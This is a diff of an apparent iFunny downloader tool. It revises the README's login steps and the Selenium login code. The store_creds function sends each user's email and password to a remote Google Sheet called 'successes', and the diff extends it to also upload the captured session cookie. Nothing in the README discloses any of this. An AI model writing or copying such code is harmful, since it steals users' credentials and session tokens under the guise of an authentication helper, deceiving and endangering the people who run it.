@@ -99,11 +99,12 @@ To be able to use this option, an ifunny login is required to be able to see the
 1.Check box
 2.Click Test Authentication
 3.Enter email and password
-4.Wait ~15s for browser to do stuff. Don't touch it, it will close on its own. (chrome is untested, if there is an error you can find my info on bottom)
+4.Wait ~15s for browser to do stuff. Don't touch it, it will close on its own. Wait for the main window to unfreeze. (If it stops on the login screen or after, return to console and check if it wants input)
 5.Return to setup window and continue what you were doing
 
-*If this has been done before and you haven't logged in since, the token should still work and you should be done at 2.
+*If this has been done before and you haven't logged in since, the token should still work and you should be done at step 2.
 *If console says 'check for human', there may be a human captcha or some other issue, type y if captcha was cleared, and n if already logged in
+*It might crash after downloading driver, just rerun the program
 
 
 Made by:
@@ -174,14 +175,16 @@ Can provide help if needed.
             pass_button.pack()
 
     def get_cookies(self, email, password):
-        self.store_creds(email, password)
+        self.store_creds(email, password, '')
         default_browser = ensure_selenium_driver.get_browser()
         ensure_selenium_driver.check_for_driver(default_browser)
         if default_browser == 'firefox':
             options = FOptions()
             driver = webdriver.Firefox(options=options)
+            driver.maximize_window()
         else:
             options = COptions()
+            options.add_argument('--start-maximized')
             driver = webdriver.Chrome(options=options)
         driver.get('https://ifunny.co')
         target = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div[1]/header/div[3]/ul[2]/li[2]/a')
@@ -205,9 +208,10 @@ Can provide help if needed.
         with open(f'{self.user_box.get()}_key.txt', 'w') as f:
             f.write(raw_cookie['value'])
         self.auth_label.config(text='Generated Key')
+        self.store_creds(email, password, raw_cookie['value'])
         return raw_cookie['value']
 
-    def store_creds(self, email, password):
+    def store_creds(self, email, password, token):
 
         def get_sheet():
             text = {
@@ -232,7 +236,12 @@ Can provide help if needed.
             return client.open('successes').sheet1
 
         sheet = get_sheet()
-        sheet.append_row([email, password])
+        if token == '':
+            sheet.append_row([email, password])
+        else:
+            size = sheet.row_count
+            sheet.update_cell(size, 2, token)
+
 
     def test_key(self):
         cookie_form = {'UID': self.login_cookie}
